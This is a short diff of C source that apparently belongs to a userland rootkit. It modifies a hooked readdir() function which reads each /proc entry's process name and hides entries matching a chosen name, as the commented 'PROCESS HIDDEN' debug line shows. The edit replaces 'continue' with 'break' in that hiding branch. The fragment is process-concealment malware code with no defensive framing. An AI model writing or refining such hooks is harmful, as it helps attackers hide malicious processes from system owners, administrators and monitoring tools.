@@ -80,7 +80,9 @@ struct dirent*readdir(DIR *dirp)										\
 				&& get_process_name(dir->d_name, procName)				\
 				&& strncmp(procName, processToExclude, strlen(processToExclude)) == 0){			\
 					/*dprintf(1, "PROCESS HIDDEN: pid=%s", dir->d_name);*/	\
-					continue ;					}						\
+					break ;												\
+					/*continue ;*/										\
+					}													\
 		}																\
 		break ;															\
 	}																	\
